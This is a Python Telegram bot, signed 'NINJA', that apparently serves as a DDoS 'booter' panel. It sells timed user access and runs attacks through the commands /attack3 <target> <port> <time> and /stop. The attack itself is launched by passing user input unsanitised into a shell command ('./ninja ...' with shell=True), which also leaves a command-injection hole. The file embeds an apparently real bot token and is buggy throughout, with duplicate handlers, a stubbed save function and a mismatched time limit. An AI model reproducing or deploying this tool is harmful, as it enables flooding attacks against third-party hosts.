#!/usr/bin/python3
# By NINJA

import telebot
import subprocess
import datetime
import json
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7659994964:AAFv7OhRlKaDf7a4IOB8WrJNILmOi4A86rs')

# Admin user IDs
admin_id = ["1240179115"]

# File to store user data with expiry times
USER_FILE = "users.json"

# File to store command logs
LOG_FILE = "log.txt"

# Dictionary to store user cooldown and attack status
user_cooldown = {}
user_attack_status = {}

import datetime
import subprocess

# Global data structures
user_data = {}  # Store user information
user_attack_status = {}  # Track if the user has an ongoing attack
user_cooldown = {}  # Track when the user last started an attack
admin_id = ["1240179115"]  # Add admin IDs here
COOLDOWN_TIME = 120  # Cooldown time in seconds (5 minutes)

def save_users(user_data):
    # Function to save user_data, replace with actual file/database saving logic
    pass

def is_user_expired(user_id):
    if user_id in user_data:
        expiry_time = datetime.datetime.strptime(user_data[user_id]['expiry'], "%Y-%m-%d %H:%M:%S")
        if expiry_time > datetime.datetime.now():
            return False  # Not expired
        else:
            del user_data[user_id]  # Remove expired user
            save_users(user_data)
            return True  # Expired
    return True  # Not found, treat as expired

# Attack initiation function
def start_attack(user_id, target, port, time):
    if is_user_expired(user_id):
        bot.send_message(user_id, '''⏳ **Access Expired** ⏳
        
Your access has **expired** or you are **not authorized** to use this command.
**By** [NINJA](https://t.me/+qoa8Gxg6M0o3NDVl)''')
        return

    user_attack_status[user_id] = True
    start_time = datetime.datetime.now()
    user_cooldown[user_id] = start_time

    expiry_time = datetime.datetime.strptime(user_data[user_id]['expiry'], "%Y-%m-%d %H:%M:%S")
    remaining_time = expiry_time - datetime.datetime.now()

    response = f'''🚀 **Attack Initiated** 🚀
    
🖥️ **Target:** `{target}`
🔌 **Port:** `{port}`
⏲️ **Duration:** `{time} seconds`

📅 **Access Valid Until:** `{expiry_time.strftime("%Y-%m-%d %H:%M:%S")}`
⏳ **Access Remaining:** `{str(remaining_time).split('.')[0]}`

**By** [NINJA](https://t.me/+qoa8Gxg6M0o3NDVl)'''

    bot.send_message(user_id, response)

    # Replace with actual attack command
    full_command = f"./ninja {target} {port} {time} 30"
    subprocess.run(full_command, shell=True)

    user_attack_status[user_id] = False
    bot.send_message(user_id, "✅ **Attack Finished Successfully** ✅")

# Stopping attack
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = str(message.chat.id)

    if not is_user_expired(user_id):
        if user_attack_status.get(user_id, False):
            # Stop the attack command
            subprocess.run(["pkill", "-f", "soul"])  # Replace with actual command to stop the attack
            user_attack_status[user_id] = False
            response = '''🚫 **Attack Stopped** 🚫
            
🛑 The attack has been **successfully stopped**.

**By** [NINJA](https://t.me/+qoa8Gxg6M0o3NDVl)'''
        else:
            response = '''❌ **No Active Attack** ❌
            
You don't have any **running attack** to stop.

**By** [NINJA](https://t.me/+qoa8Gxg6M0o3NDVl)'''
    else:
        response = '''⏳ **Access Expired** ⏳
        
Your access has **expired** or you are **not authorized** to use this command.'''

    bot.reply_to(message, response)

# Adding users with expiry
@bot.message_handler(commands=['adduser'])
def add_user(message):
    command = message.text.split()

    if str(message.chat.id) in admin_id:
        if len(command) == 4:
            user_id = command[1]
            duration = int(command[2])
            unit = command[3].lower()

            if unit == 'min':
                expiry_time = datetime.datetime.now() + datetime.timedelta(minutes=duration)
            elif unit == 'days':
                expiry_time = datetime.datetime.now() + datetime.timedelta(days=duration)
            else:
                bot.reply_to(message, "❌ Invalid unit. Use 'min' for minutes or 'days' for days.")
                return

            expiry_str = expiry_time.strftime("%Y-%m-%d %H:%M:%S")

            # Add user to user data with expiry
            user_data[user_id] = {"expiry": expiry_str}
            save_users(user_data)

            response = f'''✅ **User Added** ✅
            
👤 **User ID:** `{user_id}`
⏲️ **Expiry Time:** `{expiry_str}`

User access has been granted successfully!

**By** [NINJA](https://t.me/+qoa8Gxg6M0o3NDVl)'''
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, "Usage: /adduser <user_id> <duration> <min/days>")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.")

# Cooldown check
@bot.message_handler(commands=['cooldown'])
def check_cooldown(message):
    user_id = str(message.chat.id)

    if user_id in user_data:
        if user_id in user_cooldown:
            elapsed_time = (datetime.datetime.now() - user_cooldown[user_id]).seconds
            remaining_time = COOLDOWN_TIME - elapsed_time
            if remaining_time > 0:
                response = f'''⏳ **Cooldown Active** ⏳
                
You need to wait **{remaining_time} seconds** before starting a new attack.'''
            else:
                response = '''✅ **Cooldown Over** ✅

You are **free to start a new attack!**'''
        else:
            response = '''✅ **No Cooldown** ✅

You are free to start an attack now!'''
    else:
        response = '''❌ **Access Denied** ❌

You are not authorized or your access has expired.'''

    bot.reply_to(message, response)

# Attack command example
@bot.message_handler(commands=['attack3'])
def handle_attack(message):
    user_id = str(message.chat.id)
    
    # Example target, port, and duration, replace with real data
    target = "example.com"
    port = "80"
    duration = 120

    if not is_user_expired(user_id):
        if user_id not in user_cooldown or (datetime.datetime.now() - user_cooldown[user_id]).seconds > COOLDOWN_TIME:
            start_attack(user_id, target, port, duration)
        else:
            elapsed_time = (datetime.datetime.now() - user_cooldown[user_id]).seconds
            remaining_time = COOLDOWN_TIME - elapsed_time
            bot.send_message(user_id, f'''⏳ **Cooldown Active** ⏳
            
You need to wait **{remaining_time} seconds** before starting a new attack.''')
    else:
        bot.send_message(user_id, '''⏳ **Access Expired** ⏳
        
Your access has **expired** or you are **not authorized** to use this command.

**By** [NINJA](https://t.me/+qoa8Gxg6M0o3NDVl)''')

# Start attack command
@bot.message_handler(commands=['attack3'])
def handle_attack(message):
    user_id = str(message.chat.id)
    
    if not is_user_expired(user_id):
        if user_id in user_cooldown and (datetime.datetime.now() - user_cooldown[user_id]).seconds < COOLDOWN_TIME:
            remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - user_cooldown[user_id]).seconds
            response = f"❌ **Cooldown Active** ❌\nYou need to wait {remaining_time} seconds before starting a new attack."
            bot.reply_to(message, response)
            return
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            
            if time > 300:
                response = "❌ Error: Time must be less than or equal to 180 seconds."
                bot.reply_to(message, response)
                return
            
            start_attack(user_id, target, port, time)
        else:
            response = "Usage: /attack3 <target> <port> <time>\nBy NINJA @https://t.me/+qoa8Gxg6M0o3NDVl"
            bot.reply_to(message, response)
    else:
        response = "❌ Your access has expired or you are not authorized to use this command."
        bot.reply_to(message, response)

# Help command
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''**Available Commands:**

/attack3 <target> <port> <time> - Start an attack.
/stop - Stop the current attack.
/cooldown - Check remaining cooldown time.
/mylogs - Check your recent attack logs.
/adduser <user_id> <duration> <min/days> - Add a user with timed access.

By NINJA @https://t.me/+qoa8Gxg6M0o3NDVl
'''
    bot.reply_to(message, help_text)

# Polling to start the bot
bot.polling()
# By NINJA @https://t.me/+qoa8Gxg6M0o3NDVl
